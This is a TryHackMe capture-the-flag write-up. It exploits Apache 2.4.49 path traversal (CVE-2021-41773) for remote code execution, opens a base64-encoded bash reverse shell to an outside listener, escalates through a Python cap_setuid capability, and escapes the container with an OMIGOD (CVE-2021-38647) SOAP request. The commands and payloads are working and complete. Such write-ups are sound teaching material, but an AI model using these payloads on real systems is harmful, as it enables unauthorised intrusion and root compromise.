# Oh My WebServer — CTF Writeup

**Platform:** TryHackMe  
**Difficulty:** Medium  
**Target IP:** `10.130.143.37`  
**Author:** Zain  

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Getting the Foothold (Apache Path Traversal & Troubleshooting RCE)](#2-getting-the-foothold-apache-path-traversal--troubleshooting-rce)
3. [Internal Privilege Escalation (Abusing Python Capabilities)](#3-internal-privilege-escalation-abusing-python-capabilities)
4. [Escaping the Container (OMIGOD to Host Root)](#4-escaping-the-container-omigod-to-host-root)

---

## 1. Reconnaissance

To save time, I didn't jump straight into a slow full-range Nmap scan. Instead, I started with **RustScan** to blast through all ports fast:

```bash
rustscan -a 10.130.143.37
```

```text
Open 10.130.143.37:22
Open 10.130.143.37:80
```

RustScan discovered two open ports immediately:
- **Port 22:** SSH
- **Port 80:** HTTP

Now let's follow up with a targeted Nmap scan with default scripts, OS detection, and version enumeration across those ports:

```bash
nmap -A -p22,80 10.130.143.37
```

### Nmap Output Highlights

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
```

Next, let's run `dirsearch` to discover any hidden endpoints, directories, or backup files:

```bash
dirsearch -u http://10.130.143.37
```

### Notable Dirsearch Results

- `[301] /assets -> http://10.130.143.37/assets/`
- `[403] /cgi-bin/`
- `[500] /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`

The specific version discovered—**Apache httpd 2.4.49**—immediately points to a notorious, critical vulnerability: **CVE-2021-41773** (Path Traversal & Remote Code Execution).

---

## 2. Getting the Foothold (Apache Path Traversal & Troubleshooting RCE)

Apache 2.4.49 introduced an incomplete path normalization fix where dot-dot (`..`) sequences encoded as `.%2e/` successfully bypass access controls.

First, let's test whether we can traverse directly to `/etc/passwd` using `curl` with `--path-as-is` (which prevents `curl` from resolving the traversal sequences locally before sending the request):

```bash
curl -s --path-as-is 'http://10.130.143.37/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

This returns a `500 Internal Server Error`. When direct document mapping fails or CGI handlers intercept the path, static file reading won't output text cleanly. However, if `mod_cgi` is enabled on the server, we can traverse into binary executables like `/bin/sh` and pass arbitrary commands via HTTP POST body data!

Let's test executing `id`:

```bash
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; id' \
  'http://10.130.143.37/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
```

Output:

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Remote Code Execution (RCE) is confirmed!

---

### The Reverse Shell Hang & Troubleshooting

Next, let's catch an interactive reverse shell on our machine. 

Start a Netcat listener:

```bash
nc -lvnp 4444
```

Then fire a standard Bash reverse shell payload:

```bash
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.129.100/4444 0>&1' \
  'http://10.130.143.37/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
```

The request hung, and no connection reached our listener. Even wrapping it in `bash -c "..."` produced no shell.

To understand why this was failing, I queried which binaries existed and checked where `/bin/sh` was pointing:

```bash
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; which bash nc python3 python; ls -la /bin/sh' \
  'http://10.130.143.37/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
```

Output:

```text
/bin/bash
/usr/bin/python3
lrwxrwxrwx 1 root root 4 Sep 27  2021 /bin/sh -> dash
```

This revealed two key reasons for the failure:
1. `/bin/sh` is symlinked to **dash**, not **bash**. `dash` does not support `/dev/tcp/` socket redirection.
2. The nested quotes, ampersands, and redirect symbols were being mangled during raw CGI parameter parsing.

---

### The Clean Fix: Base64 Encoded Payload

To bypass character mangling and guarantee the command executes through true `/bin/bash`, we Base64-encode our reverse shell payload on our local machine first:

```bash
echo "bash -i >& /dev/tcp/192.168.129.100/4444 0>&1" | base64
```

Payload string:
```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xMDAvNDQ0NCAwPiYxCg==
```

Now we send the encoded string, pipe it into `base64 -d`, and direct it explicitly to `/bin/bash`:

```bash
curl -s --path-as-is --data 'echo Content-Type: text/plain; echo; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xMDAvNDQ0NCAwPiYxCg==" | base64 -d | bash' \
  'http://10.130.143.37/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
```

Our Netcat listener catches the session instantly:

```text
connect to [192.168.129.100] from (UNKNOWN) [10.130.143.37] 46832
daemon@4f7a781d4b68:/$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

We now have our foothold as `daemon`.

---

## 3. Internal Privilege Escalation (Abusing Python Capabilities)

Looking around the filesystem, a few indicators reveal that we are inside a Docker container:
- The hostname is a random container ID (`cat /etc/hostname` -> `4f7a781d4b68`).
- A `.dockerenv` file is present in `/`.

Before attempting a container breakout, let's gain full root privileges inside this container. A standard privilege escalation check on Linux systems is inspecting file capabilities:

```bash
getcap -r / 2>/dev/null
```

Output:

```text
/usr/bin/python3.8 = cap_setuid+ep
```

### Abusing `cap_setuid`

Normally, non-root users cannot change their UID to `0`. However, the `cap_setuid` capability explicitly allows the `/usr/bin/python3.8` binary to manipulate process user IDs without requiring SUID bits or `sudo` rights!

We can abuse this directly using a short Python one-liner to set our effective UID to `0` and spawn a root shell:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Checking our privileges:

```bash
id
# uid=0(root) gid=1(daemon) groups=1(daemon)
```

We are now `root` inside the container! We can grab the user flag:

```bash
cat /root/user.txt
```

---

## 4. Escaping the Container (OMIGOD to Host Root)

Being root inside a Docker container does not give us access to the underlying host. To escape, we need to inspect the container's internal network environment.

Let's check the container's routing table to find the host gateway IP:

```bash
ip route
```

```text
default via 172.17.0.1 dev eth0 
172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2
```

The gateway IP is **`172.17.0.1`**—this is the actual host machine hosting our Docker instance.

Since the container does not have `nmap` installed, we can scan the host gateway using a fast built-in Bash loop:

```bash
for port in 22 80 443 1270 5985 5986 8080; do
  (echo > /dev/tcp/172.17.0.1/$port) >/dev/null 2>&1 && echo "Port $port is open on host"
done
```

The scan identifies an interesting service:
- **Port 5986:** Open Management Infrastructure (OMI / WinRM over HTTPS)

---

### Introducing OMIGOD (CVE-2021-38647)

**What is OMI?** Open Management Infrastructure is Microsoft's open-source CIM/WMI implementation for Linux systems, often installed by default on Azure Linux virtual machines.

The vulnerability—known as **OMIGOD**—is an authentication bypass flaw. When an HTTP/SOAP request is sent to the OMI management port without an `Authorization` header, OMI strips the authentication check entirely and executes the command directly as the host's `root` user!

We can craft a SOAP XML request to port 5986 on `172.17.0.1` asking it to read `/root/root.txt`:

```bash
curl -k -H "Content-Type: application/soap+xml;charset=UTF-8" \
-d '<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wmi/root/omi/SCX_OperatingSystem">
  <s:Header>
    <a:To>HTTP://172.17.0.1:5986/wsman/</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/wmi/root/omi/SCX_OperatingSystem</w:ResourceURI>
    <a:ReplyTo><a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>
    <a:Action s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wsman/1/wsman.cgi</a:Action>
    <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
    <a:MessageID>uuid:00000000-0000-0000-0000-000000000000</a:MessageID>
  </s:Header>
  <s:Body>
    <p:ExecuteShellCommand_INPUT>
      <p:command>cat /root/root.txt</p:command>
      <p:timeout>0</p:timeout>
    </p:ExecuteShellCommand_INPUT>
  </s:Body>
</s:Envelope>' \
https://172.17.0.1:5986/wsman/
```

### Result

The host returns an XML response with the command output embedded inside the `<p:StdOut>` tags:

```xml
<p:StdOut>THM{...redacted_root_flag...}</p:StdOut>
```

We dumped the host's root flag directly through the internal OMI interface. Box successfully pawned! 
